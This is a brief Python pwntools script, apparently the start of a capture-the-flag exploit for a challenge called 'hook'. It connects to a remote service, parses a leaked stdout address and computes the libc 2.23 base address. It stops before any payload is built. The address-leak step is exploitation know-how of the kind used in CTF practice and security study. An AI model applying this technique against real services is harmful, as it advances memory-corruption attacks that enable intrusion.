from pwn import *

port = 0
rem = remote("", port)
lib = ELF("./hook/problem/libc-2.23.so")


rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
